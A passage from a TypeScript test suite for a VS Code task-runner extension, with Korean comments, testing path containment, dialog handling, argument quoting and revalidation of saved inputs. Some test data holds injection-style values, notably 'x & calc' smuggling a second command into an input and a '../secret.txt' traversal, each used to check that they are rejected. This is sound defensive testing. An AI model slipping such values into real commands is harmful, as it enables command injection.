			const resolved = resolveWithinWorkspace('build/out/report.txt', [root], root);
			assert.strictEqual(resolved, path.join(root, 'build', 'out', 'report.txt'));
		});
		test('rejects relative paths that escape the root via ..', () => {
			assert.throws(
				() => resolveWithinWorkspace('../secret.txt', [root], root),
				/outside/
			);
		});
		test('falls back to the first workspace root when no baseDir is provided', () => {
			const resolved = resolveWithinWorkspace('report.txt', [root]);
			assert.strictEqual(resolved, path.join(root, 'report.txt'));
		});
	});

	suite('대화형 취소는 전용 오류 타입을 쓴다', () => {
		// 다섯 핸들러가 같은 타입을 던져야 액션이 '취소'로 마감된다. 평범한
		// `Error` 로 되돌아가면 그 액션만 조용히 빨간 오류/`failure` 로 회귀하는데,
		// 문구는 그대로라 눈으로는 드러나지 않는다. 문자열이 아니라 `name` 을
		// 본다 — 메시지는 지역화되므로 로케일에 따라 깨진다.
		async function assertPromptCancelled(fn: () => Promise<unknown>, what: string): Promise<void> {
			await assert.rejects(fn, (e: unknown) => {
				assert.ok(e instanceof Error, `${what}: Error 가 아니다`);
				assert.strictEqual(e.name, 'PromptCancelledError', `${what}: ${e.name} 로 던졌다`);
				return true;
			});
		}

		test('folderDialog 취소', async () => {
			const original = vscode.window.showOpenDialog;
			(vscode.window as any).showOpenDialog = async () => undefined;
			try {
				await assertPromptCancelled(() => handleFolderDialog({ id: 'pick' }), 'folderDialog');
			} finally {
				(vscode.window as any).showOpenDialog = original;
			}
		});

		test('quickPick 취소', async () => {
			const original = vscode.window.showQuickPick;
			(vscode.window as any).showQuickPick = async () => undefined;
			try {
				await assertPromptCancelled(
					() => handleQuickPick({ id: 'pick', items: ['a', 'b'] }),
					'quickPick'
				);
			} finally {
				(vscode.window as any).showQuickPick = original;
			}
		});

		test('envPick 취소', async () => {
			const original = vscode.window.showQuickPick;
			(vscode.window as any).showQuickPick = async () => undefined;
			try {
				await assertPromptCancelled(() => handleEnvPick({ id: 'pick' }), 'envPick');
			} finally {
				(vscode.window as any).showQuickPick = original;
			}
		});

		test('fileDialog 취소', async () => {
			const original = vscode.window.showOpenDialog;
			(vscode.window as any).showOpenDialog = async () => undefined;
			try {
				await assertPromptCancelled(() => handleFileDialog({ id: 'pick' }), 'fileDialog');
			} finally {
				(vscode.window as any).showOpenDialog = original;
			}
		});
	});

	/**
	 * 다중 선택 결과의 모양 (0.6.57).
	 *
	 * `folderDialog` 는 `canSelectMany` 를 VS Code 로 그대로 넘겨 폴더를 여러 개
	 * 고를 수 있었는데도 **첫 폴더만 쓰고 나머지를 조용히 버렸다** — 0.6.51 이
	 * `fileDialog` 에서 고친 것과 같은 결함이 폴더 쪽에만 남아 있었다.
	 */
	suite('dialog 다중 선택 결과', () => {
		const uris = (...paths: string[]) => paths.map(p => vscode.Uri.file(p));

		async function withPicked<T>(picked: vscode.Uri[], run: () => Promise<T>): Promise<T> {
			const original = vscode.window.showOpenDialog;
			(vscode.window as any).showOpenDialog = async () => picked;
			try {
				return await run();
			} finally {
				(vscode.window as any).showOpenDialog = original;
			}
		}

		test('canSelectMany 를 VS Code 로 그대로 넘긴다', async () => {
			// 넘기지 않으면 대화상자에서 애초에 여러 개를 고를 수 없다. 아래
			// 결과 검사들은 mock 이 배열을 돌려주므로 옵션 전달이 깨져도 통과한다.
			const seen: vscode.OpenDialogOptions[] = [];
			const original = vscode.window.showOpenDialog;
			(vscode.window as any).showOpenDialog = async (options: vscode.OpenDialogOptions) => {
				seen.push(options);
				return uris('/tmp/th-a');
			};
			try {
				await handleFolderDialog({ id: 'pick', options: { canSelectMany: true } });
				await handleFileDialog({ id: 'pick2', options: { canSelectMany: true } });
			} finally {
				(vscode.window as any).showOpenDialog = original;
			}
			assert.strictEqual(seen.length, 2);
			assert.strictEqual(seen[0].canSelectMany, true, 'folderDialog 가 옵션을 삼켰다');
			assert.strictEqual(seen[0].canSelectFolders, true, 'folderDialog 는 폴더 모드를 강제해야 한다');
			assert.strictEqual(seen[0].canSelectFiles, false);
			assert.strictEqual(seen[1].canSelectMany, true, 'fileDialog 가 옵션을 삼켰다');
		});

		test('folderDialog 가 고른 폴더 전부를 돌려준다', async () => {
			const picked = uris('/tmp/th-a', '/tmp/th-b', '/tmp/th-c');
			const result: any = await withPicked(picked, () =>
				handleFolderDialog({ id: 'pick', options: { canSelectMany: true } }));

			assert.deepStrictEqual(result.paths, picked.map(u => u.fsPath));
			assert.deepStrictEqual(result.names, ['th-a', 'th-b', 'th-c']);
			assert.strictEqual(result.count, 3);
			// 단일 필드는 첫 폴더를 가리킨다 — 기존 액션이 그대로 동작해야 한다.
			assert.strictEqual(result.path, picked[0].fsPath);
			assert.strictEqual(result.name, 'th-a');
		});

		test('folderDialog 단일 선택도 같은 키를 채운다 (원소 하나)', async () => {
			// 비워 두면 단일 선택 태스크에 쓴 `${pick.paths}` 가 Doctor 에서만
			// 미해결로 잡히는, 0.6.52 가 fileDialog 쪽에서 고친 어긋남이 생긴다.
			const picked = uris('/tmp/th-only');
			const result: any = await withPicked(picked, () => handleFolderDialog({ id: 'pick' }));
			assert.deepStrictEqual(result.paths, [picked[0].fsPath]);
			assert.strictEqual(result.count, 1);
		});

		test('fileDialog 와 folderDialog 의 결과 키가 같다', async () => {
			const picked = uris('/tmp/th-x.bin', '/tmp/th-y.bin');
			const file: any = await withPicked(picked, () =>
				handleFileDialog({ id: 'pick', options: { canSelectMany: true } }));
			const folder: any = await withPicked(picked, () =>
				handleFolderDialog({ id: 'pick', options: { canSelectMany: true } }));
			assert.deepStrictEqual(Object.keys(file).sort(), Object.keys(folder).sort(),
				'두 다이얼로그의 결과 모양이 다르면 문서가 둘 중 하나에 대해 거짓말을 하게 된다');
		});
	});

	suite('isOnlyPromptCancellation', () => {
		// 다이얼로그를 닫은 것은 실패가 아니다. 이 술어가 액션 마감을
		// `failure`(빨간 토스트 + ✗)와 `cancelled`(조용히) 로 가른다.
		const cancel = () => new PromptCancelledError('File selection was canceled.');

		test('classifies a bare prompt cancellation', () => {
			assert.strictEqual(isOnlyPromptCancellation(cancel()), true);
		});

		test('does not classify an ordinary failure', () => {
			assert.strictEqual(isOnlyPromptCancellation(new Error('exit code 1')), false);
		});

		test('classifies an AggregateError made only of cancellations', () => {
			// 병렬 파이프라인은 실패들을 AggregateError 로 묶는다.
			assert.strictEqual(isOnlyPromptCancellation(new AggregateError([cancel(), cancel()])), true);
		});

		test('does NOT classify a mix of cancellation and real failure', () => {
			// 취소가 섞였다는 이유로 진짜 오류를 삼키면 안 된다.
			const mixed = new AggregateError([cancel(), new Error('compiler exited with 2')]);
			assert.strictEqual(isOnlyPromptCancellation(mixed), false);
		});

		test('does not classify an empty AggregateError', () => {
			assert.strictEqual(isOnlyPromptCancellation(new AggregateError([])), false);
		});

		test('handles nested AggregateErrors', () => {
			assert.strictEqual(
				isOnlyPromptCancellation(new AggregateError([new AggregateError([cancel()])])),
				true
			);
			assert.strictEqual(
				isOnlyPromptCancellation(new AggregateError([new AggregateError([new Error('boom')])])),
				false
			);
		});

		test('terminates on a self-referential AggregateError', () => {
			const loop: any = new AggregateError([]);
			loop.errors = [loop];
			assert.strictEqual(isOnlyPromptCancellation(loop), false);
		});

		test('does not classify a stop as a prompt cancellation', () => {
			// Stop 은 별도 경로(manuallyTerminatedActions)로 마감된다.
			assert.strictEqual(isOnlyPromptCancellation(new ActionStoppedError()), false);
		});

		test('ignores non-error values', () => {
			assert.strictEqual(isOnlyPromptCancellation(undefined), false);
			assert.strictEqual(isOnlyPromptCancellation('File selection was canceled.'), false);
		});
	});

	suite('resolveArchiveTaskPath', () => {
		// zip/unzip 의 내장 엔진은 cwd 개념이 없어 `path.resolve` 가 extension
		// host 의 `process.cwd()`(= VS Code 를 띄운 위치)를 기준으로 삼았다.
		// 외부 `tool` 경로는 자식 프로세스의 cwd 를 쓰므로, 같은 태스크가
		// `tool` 하나로 다른 위치에 파일을 만들었다.
		const base = path.resolve(os.tmpdir(), 'taskhub-archive-base');

		test('resolves a relative archive path against the base, not process.cwd()', () => {
			const resolved = resolveArchiveTaskPath('build.zip', base);
			assert.strictEqual(resolved, path.join(base, 'build.zip'));
			assert.notStrictEqual(resolved, path.resolve('build.zip'));
		});

		test('resolves relative subpaths against the base', () => {
			const resolved = resolveArchiveTaskPath('out/dist/app.zip', base);
			assert.strictEqual(resolved, path.join(base, 'out', 'dist', 'app.zip'));
		});

		test('leaves absolute paths untouched — dialog picks may live anywhere', () => {
			// 번들 예제(`media/actions_example.json`)의 zip 액션이 folderDialog 로
			// 고른 폴더를 그 자리에서 압축한다. 워크스페이스로 묶으면 안 된다.
			const outside = path.resolve(os.tmpdir(), 'somewhere-else', 'pick.zip');
			assert.strictEqual(resolveArchiveTaskPath(outside, base), outside);
		});

		test('allows a relative path to escape the base — no containment here', () => {
			// 이 헬퍼의 계약은 "기준점 고정"이지 "격리"가 아니다. 격리는
			// writeFile/appendFile/output.filePath 쪽 `resolveWithinWorkspace` 몫.
			const resolved = resolveArchiveTaskPath(path.join('..', 'sibling.zip'), base);
			assert.strictEqual(resolved, path.resolve(base, '..', 'sibling.zip'));
		});

		test('falls back to process-relative resolution when there is no base', () => {
			// 워크스페이스 없이 열린 창. 기준으로 삼을 것이 없으므로 기존 동작.
			assert.strictEqual(resolveArchiveTaskPath('build.zip', ''), path.resolve('build.zip'));
			assert.strictEqual(resolveArchiveTaskPath('build.zip', undefined), path.resolve('build.zip'));
		});

		test('passes empty input through unchanged', () => {
			assert.strictEqual(resolveArchiveTaskPath('', base), '');
		});
	});

	suite('normalizeTags', () => {
		test('should return undefined for non-array input', () => {
			assert.strictEqual(normalizeTags(null), undefined);
			assert.strictEqual(normalizeTags(undefined), undefined);
			assert.strictEqual(normalizeTags('string'), undefined);
			assert.strictEqual(normalizeTags({}), undefined);
		});

		test('should return undefined for empty array', () => {
			assert.strictEqual(normalizeTags([]), undefined);
		});

		test('should normalize string array', () => {
			const result = normalizeTags(['tag1', 'tag2', 'tag3']);
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should trim tags', () => {
			const result = normalizeTags(['  tag1  ', '  tag2  ', 'tag3']);
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should filter out empty tags', () => {
			const result = normalizeTags(['tag1', '', 'tag2', '   ', 'tag3']);
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should filter out non-string items', () => {
			const result = normalizeTags(['tag1', 123, null, 'tag2', undefined]);
			assert.deepStrictEqual(result, ['tag1', 'tag2']);
		});

		test('should return undefined if all tags are filtered out', () => {
			const result = normalizeTags(['', '   ', 123, null]);
			assert.strictEqual(result, undefined);
		});
	});

	suite('parseTagInput', () => {
		test('should return undefined for undefined input', () => {
			assert.strictEqual(parseTagInput(undefined), undefined);
		});

		test('should return undefined for empty string', () => {
			assert.strictEqual(parseTagInput(''), undefined);
		});

		test('should parse comma-separated tags', () => {
			const result = parseTagInput('tag1,tag2,tag3');
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should trim tags', () => {
			const result = parseTagInput('  tag1  ,  tag2  , tag3');
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should filter out empty tags', () => {
			const result = parseTagInput('tag1,,tag2,  ,tag3');
			assert.deepStrictEqual(result, ['tag1', 'tag2', 'tag3']);
		});

		test('should return undefined if all tags are empty', () => {
			const result = parseTagInput(',  ,  ');
			assert.strictEqual(result, undefined);
		});
	});

	suite('serializeFavorites', () => {
		test('should serialize basic favorite entry', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1' }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1' }
			]);
		});

		test('should serialize favorite with group', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1', group: 'Group1' }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1', group: 'Group1' }
			]);
		});

		test('should serialize favorite with tags', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1', tags: ['tag1', 'tag2'] }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1', tags: ['tag1', 'tag2'] }
			]);
		});

		test('should serialize favorite with line', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1', line: 15 }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1', line: 15 }
			]);
		});

		test('should serialize favorite with group and tags', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1', group: 'Group1', tags: ['tag1'] }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1', group: 'Group1', tags: ['tag1'] }
			]);
		});

		test('should not include empty tags array', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1', tags: [] }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1' }
			]);
		});

		test('should handle multiple entries', () => {
			const entries = [
				{ title: 'File1', path: '/path/to/file1' },
				{ title: 'File2', path: '/path/to/file2', group: 'Group1' }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1' },
				{ title: 'File2', path: '/path/to/file2', group: 'Group1' }
			]);
		});

		test('should omit metadata fields', () => {
			const entries = [
				{
					title: 'File1',
					path: '/path/to/file1',
					sourceFile: '/workspace/.vscode/favorites.json',
					workspaceFolder: '/workspace'
				}
			];
			const result = serializeFavorites(entries as any);
			assert.deepStrictEqual(result, [
				{ title: 'File1', path: '/path/to/file1' }
			]);
		});
	});

	suite('serializeLinks', () => {
		test('should serialize basic link entry', () => {
			const entries = [
				{ title: 'Link1', link: 'https://example.com' }
			];
			const result = serializeLinks(entries);
			assert.deepStrictEqual(result, [
				{ title: 'Link1', link: 'https://example.com' }
			]);
		});

		test('should serialize link with group and tags', () => {
			const entries = [
				{ title: 'Link1', link: 'https://example.com', group: 'Group1', tags: ['tag1'] }
			];
			const result = serializeLinks(entries);
			assert.deepStrictEqual(result, [
				{ title: 'Link1', link: 'https://example.com', group: 'Group1', tags: ['tag1'] }
			]);
		});

		test('should omit metadata fields', () => {
			const entries = [
				{
					title: 'Link1',
					link: 'https://example.com',
					group: 'Group1',
					tags: ['tag1'],
					sourceFile: '/workspace/.vscode/links.json'
				}
			];
			const result = serializeLinks(entries as any);
			assert.deepStrictEqual(result, [
				{ title: 'Link1', link: 'https://example.com', group: 'Group1', tags: ['tag1'] }
			]);
		});
	});

	suite('quotePowerShellArgument', () => {
		test('should quote empty string', () => {
			const result = quotePowerShellArgument('');
			assert.strictEqual(result, "''");
		});

		test('should quote simple string', () => {
			const result = quotePowerShellArgument('hello');
			assert.strictEqual(result, "'hello'");
		});

		test('should escape single quotes', () => {
			const result = quotePowerShellArgument("don't");
			assert.strictEqual(result, "'don''t'");
		});

		test('should handle string with spaces', () => {
			const result = quotePowerShellArgument('hello world');
			assert.strictEqual(result, "'hello world'");
		});
	});

	suite('Windows native command helpers', () => {
		test('캡처 native 시작 실패는 원래 명령 이름을 PowerShell로 재시도하지 않는다', async () => {
			const originalPlatform = process.platform;
			const resolvedExecutable = 'C:\\taskhub-review-does-not-exist\\native.exe';
			try {
				Object.defineProperty(process, 'platform', { value: 'win32' });
				let caught: NodeJS.ErrnoException | undefined;
				try {
					await executeShellCommand(
						'native.exe', [], undefined, undefined, undefined, undefined, undefined,
						undefined, undefined, false, undefined, undefined, false, false,
						{
							env: { PATH: 'C:\\taskhub-review-does-not-exist' },
							cwd: 'C:\\work',
							isFile: candidate => candidate === resolvedExecutable,
						}
					);
				} catch (error) {
					caught = error as NodeJS.ErrnoException;
				}
				assert.ok(caught, '존재하지 않는 고정 실행 경로가 성공으로 처리됐다');
				assert.strictEqual(caught!.code, 'ENOENT');
				assert.strictEqual(
					caught!.path,
					resolvedExecutable,
					'PowerShell 재시도가 아니라 처음 고정한 실행 파일의 실패를 반환해야 한다'
				);
			} finally {
				Object.defineProperty(process, 'platform', { value: originalPlatform });
			}
		});

		test('quoteWindowsCommandLineArgument preserves embedded quotes', () => {
			assert.strictEqual(
				quoteWindowsCommandLineArgument('process.stdout.write("ok")'),
				'"process.stdout.write(\\"ok\\")"'
			);
		});

		test('buildNativeCommandInvocation keeps argv boundaries', () => {
			const result = buildNativeCommandInvocation(
				'node', ['-e', 'process.stdout.write("ok")'], 'C:\\node\\node.exe'
			);
			assert.strictEqual(result.executable, 'C:\\node\\node.exe');
			assert.deepStrictEqual(result.args, ['-e', 'process.stdout.write("ok")']);
			assert.strictEqual(
				formatNativeCommandDisplay('node', ['-e', 'process.stdout.write("ok")']),
				result.display
			);
		});

		test('windowsCommandIsDirectlyLaunchable: native binaries resolve to files, scripts/shims/builtins do not', () => {
			const lookup = {
				env: { PATH: 'C:\\bin;C:\\tools' },
				isFile: (p: string) =>
					p === 'C:\\bin\\node.exe' ||
					p === 'C:\\tools\\git.exe' ||
					p === 'C:\\tools\\7z.exe',
			};
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('node', ['-e', 'x'], lookup), true);   // resolves to node.exe
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('git status', [], lookup), true);       // resolves to git.exe
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('npm test', [], lookup), false);        // only npm.cmd would exist
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('node.exe', ['-e', 'x'], lookup), true); // exact PATH match
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('C:\\tools\\7z.exe', ['a'], lookup), true);
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('build.cmd', [], lookup), false);       // script shim
			assert.strictEqual(windowsCommandIsDirectlyLaunchable('echo hi', [], lookup), false);         // shell builtin/alias
		});
	});

	/**
	 * 다중 선택 `fileDialog` 와 `args` 배열 확장 (0.6.51).
	 *
	 * `options.canSelectMany` 는 예전부터 VS Code 로 전달됐지만 결과는 첫 파일만
	 * 쓰고 나머지를 조용히 버렸다. 그리고 고른 경로들을 **개수가 정해지지 않은
	 * 인자들**로 넘길 방법이 없었다 — 문자열로 이어 붙이면 토큰 경계 보존 때문에
	 * 인자 하나가 되거나, 공백으로 쪼개져 경로에 공백이 있는 순간 깨진다.
	 */
	suite('expandArgTemplate', () => {
		const ctx = {
			pick: {
				paths: ['c:\\test\\test1.bin', 'c:\\my docs\\test2.bin', 'c:\\test\\test3.bin'],
				path: 'c:\\test\\test1.bin',
				count: 3,
			},
			one: { paths: ['only.bin'] },
			none: { paths: [] },
		};

		test('배열 참조 하나가 인자 여러 개로 펼쳐진다', () => {
			assert.deepStrictEqual(expandArgTemplate('${pick.paths}', ctx), ctx.pick.paths);
		});

		test('공백이 든 경로가 쪼개지지 않는다', () => {
			const expanded = expandArgTemplate('${pick.paths}', ctx);
			assert.strictEqual(expanded[1], 'c:\\my docs\\test2.bin');
			assert.strictEqual(expanded.length, 3, '공백에서 인자가 갈라졌다');
		});

		test('실제 사용 형태: 위치 인자 사이에 끼워도 순서가 유지된다', () => {
			const template = [
				'-3', 'make_report.py', '${pick.paths}',
				'--debug-dir', 'c:\\test\\debug', '--output', 'result.html', '--with-slow',
			];
			const args = template.flatMap(a => expandArgTemplate(a, ctx));
			assert.deepStrictEqual(args, [
				'-3', 'make_report.py',
				'c:\\test\\test1.bin', 'c:\\my docs\\test2.bin', 'c:\\test\\test3.bin',
				'--debug-dir', 'c:\\test\\debug', '--output', 'result.html', '--with-slow',
			]);
		});

		test('1개 / 0개 선택도 그대로 다룬다', () => {
			assert.deepStrictEqual(expandArgTemplate('${one.paths}', ctx), ['only.bin']);
			// 0개면 인자 자체가 사라진다 — 빈 문자열 인자를 남기는 것보다 낫다.
			assert.deepStrictEqual(expandArgTemplate('${none.paths}', ctx), []);
		});

		test('배열이 아닌 값은 평소대로 인자 하나', () => {
			assert.deepStrictEqual(expandArgTemplate('${pick.path}', ctx), ['c:\\test\\test1.bin']);
			assert.deepStrictEqual(expandArgTemplate('--count=${pick.count}', ctx), ['--count=3']);
			assert.deepStrictEqual(expandArgTemplate('plain', ctx), ['plain']);
		});

		test('앞뒤에 글자가 붙으면 펼치지 않고 이어 붙인다', () => {
			// 각 항목에 접두사를 붙이라는 것인지 알 수 없으므로 펼치지 않는다.
			// 0.6.57부터 배열은 문자열 자리에서 공백으로 이어 붙으므로, 결과는
			// 리터럴이 아니라 **인자 한 칸**이다 — 의도대로 동작할 리 없는
			// 형태라 Doctor가 `args.array-joined`로 따로 짚어 준다.
			assert.deepStrictEqual(
				expandArgTemplate('--file=${pick.paths}', ctx),
				['--file=c:\\test\\test1.bin c:\\my docs\\test2.bin c:\\test\\test3.bin']
			);
		});

		test('알 수 없는 참조는 그대로 남는다 (기존 계약)', () => {
			assert.deepStrictEqual(expandArgTemplate('${nope.paths}', ctx), ['${nope.paths}']);
		});

		test('resolvePipelineReference 는 보간과 같은 탐색 규칙을 쓴다', () => {
			// 둘이 어긋나면 "보간은 되는데 확장은 안 되는" 참조가 생긴다.
			const c = { a: { output: 'via-output' }, b: { paths: ['x'] }, plain: 'top' };
			// 속성이 붙었는데 그 속성이 없으면 undefined — output 으로 떨어지지
			// 않는다. capture 실패가 stdout 전체로 조용히 대체되던 경로였다.
			assert.strictEqual(resolvePipelineReference('a.anything', c), undefined);
			// bare 참조는 여전히 대표 결과(output)로 해석된다.
			assert.strictEqual(resolvePipelineReference('a', c), 'via-output');
			assert.deepStrictEqual(resolvePipelineReference('b.paths', c), ['x']);
			assert.strictEqual(resolvePipelineReference('plain', c), 'top');
			assert.strictEqual(resolvePipelineReference('missing', c), undefined);
		});
	});

	/**
	 * 저장된 입력 재실행과 검증 (0.6.50).
	 *
	 * History 재실행과 프리셋은 저장된 값을 **그대로** 썼다. 그러면
	 * `validatePattern` 은 "그 순간의 입력 안내" 일 뿐 값에 대한 보장이 아니다 —
	 * 패턴을 나중에 조이거나 프리셋 파일을 손으로 고치면 재실행이 검증을
	 * 통째로 건너뛴다. Doctor 가 이 패턴을 근거로 주입 경고를 **면제**하므로,
	 * 그 근거가 실제로 참이어야 면제가 정당해진다.
	 */
	suite('savedInputStillValid', () => {
		test('현재 패턴을 만족하지 않는 저장값은 거부한다', () => {
			const task = { type: 'inputBox', validatePattern: '^[A-Za-z_][A-Za-z0-9_]*$' };
			assert.strictEqual(savedInputStillValid(task, { value: 'PATH' }), true);
			assert.strictEqual(
				savedInputStillValid(task, { value: 'x & calc' }), false,
				'패턴을 조이기 전에 저장된 위험한 값이 재실행에서 그대로 쓰인다'
			);
		});

		test('prefix/suffix 는 검증 대상에서 뺀다 (입력 시점과 같게)', () => {
			const task = { type: 'inputBox', validatePattern: '^[0-9]+$', prefix: 'v', suffix: '-rc' };
			assert.strictEqual(savedInputStillValid(task, { value: 'v123-rc' }), true);
			assert.strictEqual(savedInputStillValid(task, { value: 'vabc-rc' }), false);
		});

		test('잘못된 정규식은 입력 시점과 같게 무시한다', () => {
			// 두 경로가 다른 판정을 하면 그것대로 혼란스럽다.
			assert.strictEqual(savedInputStillValid({ type: 'inputBox', validatePattern: '[' }, { value: 'x' }), true);
		});

		test('quickPick 저장값이 현재 목록에 없으면 거부한다', () => {
			const task = { type: 'quickPick', items: ['dev', 'prod'] };
			assert.strictEqual(savedInputStillValid(task, { value: 'dev' }), true);
			assert.strictEqual(savedInputStillValid(task, { value: 'staging' }), false);
			// 동적 목록은 비교 기준이 없으므로 건드리지 않는다.
			assert.strictEqual(
				savedInputStillValid({ type: 'quickPick', itemsFromCommand: 'git branch' }, { value: 'x' }), true);
		});

		test('allowCustom의 저장값은 정적 목록에 없어도 재실행할 수 있다', () => {
			const task = { type: 'quickPick', allowCustom: true, items: ['main', 'develop'] };
			assert.strictEqual(savedInputStillValid(task, {
				label: 'feature/new-flow', value: 'feature/new-flow',
			}), true);
			assert.strictEqual(savedInputStillValid(task, { label: '', value: '' }), false);
		});

		/**
		 * `value` 매핑을 쓰면 저장된 `value` 는 **목록에 없는 문자열**이다
		 * (`--with-option`). 그것을 목록과 비교하면 재실행이 매번 거부돼 다시
		 * 묻게 되므로, 비교 기준은 `label` 이어야 한다.
		 */
		test('value 매핑은 label 로 검사한다', () => {
			const task = {
				type: 'quickPick',
				items: [
					{ label: 'With option', value: '--with-option' },
					{ label: 'Plain', value: [] },
				],
			};
			assert.strictEqual(
				savedInputStillValid(task, { label: 'With option', value: '--with-option' }), true,
				'매핑을 쓴 액션이 재실행마다 다시 물었다'
			);
			assert.strictEqual(
				savedInputStillValid(task, { label: 'Gone', value: '--with-option' }), false,
				'목록에서 사라진 선택지가 그대로 재사용된다'
			);
			// 0.7.31 이전 기록에는 `label` 이 없다 — 그때만 `value` 로 떨어진다.
			assert.strictEqual(savedInputStillValid(task, { value: 'With option' }), true);
			// 배열 `value` 만 있는 옛 기록은 비교할 문자열이 없으므로 통과시킨다.
			assert.strictEqual(savedInputStillValid(task, { value: [] }), true);
		});

		test('제약이 없는 태스크는 그대로 통과시킨다', () => {
			assert.strictEqual(savedInputStillValid({ type: 'inputBox' }, { value: 'anything ; goes' }), true);
			assert.strictEqual(savedInputStillValid({ type: 'fileDialog' }, { path: '/tmp/a b.txt' }), true);
		});

		/**
		 * 0.6.57 이전 History 항목 (배열 필드 없음).
		 *
		 * 저장된 입력이 있으면 핸들러를 **건너뛴다.** 그래서 옛 기록을 그대로
		 * 재사용하면 새로 추가된 `${pick.paths}` 가 재실행에서만 리터럴로 남는다.
		 */
		test('다중 선택 다이얼로그의 옛 저장값은 다시 고르게 한다', () => {
			const many = { type: 'folderDialog', options: { canSelectMany: true } };
			assert.strictEqual(
				savedInputStillValid(many, { path: '/tmp/a', name: 'a' }), false,
				'무엇을 골랐는지 첫 항목밖에 남아 있지 않다 — 조용히 하나만 처리하면 안 된다'
			);
			// 새 형식(배열이 있는 기록)은 그대로 쓴다.
			assert.strictEqual(
				savedInputStillValid(many, { path: '/tmp/a', paths: ['/tmp/a', '/tmp/b'], count: 2 }), true);
			// 단일 선택은 보정할 수 있으므로 거부하지 않는다.
			assert.strictEqual(savedInputStillValid({ type: 'folderDialog' }, { path: '/tmp/a' }), true);
		});
	});

	suite('backfillDialogArrays', () => {
		test('옛 단일 선택 결과에 배열 필드를 채운다', () => {
			const saved = { path: '/tmp/build/app.elf', dir: '/tmp/build', name: 'app.elf', fileNameOnly: 'app', fileExt: 'elf' };
			const filled: any = backfillDialogArrays({ type: 'fileDialog' }, saved);
			assert.deepStrictEqual(filled.paths, ['/tmp/build/app.elf']);
			assert.deepStrictEqual(filled.names, ['app.elf']);
			assert.strictEqual(filled.count, 1);
			// 원본 키는 그대로 남는다 — 기존 액션이 계속 동작해야 한다.
			assert.strictEqual(filled.dir, '/tmp/build');
		});

		test('보정한 값이 실제로 args 확장에 쓰인다', () => {
			// 이 검사가 없으면 "필드를 채웠다"까지만 확인하고, 정작 리터럴이
			// 사라졌는지는 아무도 보지 않는다.
			const filled = backfillDialogArrays({ type: 'folderDialog' }, { path: '/tmp/out', name: 'out' });
			assert.deepStrictEqual(expandArgTemplate('${pick.paths}', { pick: filled }), ['/tmp/out']);
			assert.strictEqual(
				interpolatePipelineVariables('${pick.paths}', { pick: filled }), '/tmp/out');
		});

		test('이미 배열이 있으면 손대지 않는다', () => {
			const saved = { path: '/a', paths: ['/a', '/b'], names: ['a', 'b'], count: 2 };
			assert.strictEqual(backfillDialogArrays({ type: 'fileDialog' }, saved), saved);
		});

		test('다이얼로그가 아닌 태스크와 이상한 값은 그대로 돌려준다', () => {
			const saved = { value: 'x' };
			assert.strictEqual(backfillDialogArrays({ type: 'inputBox' }, saved), saved);
			assert.strictEqual(backfillDialogArrays({ type: 'fileDialog' }, undefined), undefined);
			assert.strictEqual(backfillDialogArrays({ type: 'fileDialog' }, { name: 'no path' }).count, undefined);
		});

		test('name 이 없으면 경로에서 만든다', () => {
			const filled: any = backfillDialogArrays({ type: 'fileDialog' }, { path: path.join('/tmp', 'x.bin') });
			assert.deepStrictEqual(filled.names, ['x.bin']);
		});
	});

	/**
	 * PowerShell 종료 코드 후행부 (0.6.50).
	 *
	 * `$LASTEXITCODE` 는 세션에 **남아 있는** 값이라 마지막 명령의 상태가
	 * 아니다. 그것을 `$?` 보다 먼저 적용하면 **실패가 성공으로 보고된다.**
	 */
	suite('withPowerShellExitCode', () => {
		test('성공 판정은 $? 가 먼저 한다', () => {
			const epilogue = withPowerShellExitCode('cmd /c exit 0; Write-Error boom');
			const successCheck = epilogue.indexOf('if ($taskHubSucceeded) { exit 0 }');
			const codeCheck = epilogue.indexOf('exit [int]$taskHubExitCode');
			assert.ok(successCheck >= 0, `성공 판정이 없다: ${epilogue}`);
			assert.ok(
				successCheck < codeCheck,
				'$LASTEXITCODE 를 먼저 적용하면 cmdlet 실패가 stale 한 0 에 가려 성공으로 나간다'
			);
		});

		test('실패일 때만 구체적인 코드를 되살린다', () => {
			const epilogue = withPowerShellExitCode('build.exe');
			// 0 이 아닌 코드만 되살리고, 그렇지 않으면 1 로 마감한다 —
			// stale 한 0 이 실패를 덮지 않게.
			assert.match(epilogue, /\$null -ne \$taskHubExitCode -and \[int\]\$taskHubExitCode -ne 0/);
			assert.ok(epilogue.trimEnd().endsWith('exit 1'), epilogue);
		});

		test('원본 스크립트를 앞에 그대로 둔다', () => {
			assert.ok(withPowerShellExitCode('& \'x.exe\'').startsWith("& 'x.exe'\n"));
		});
	});

	/**
	 * 보간값이 argv 경계를 넘던 문제 (0.6.50).
	 *
	 * `command` 타입으로 바꾼 것은 **셸** 주입만 닫았다. 문자열 전체를 먼저
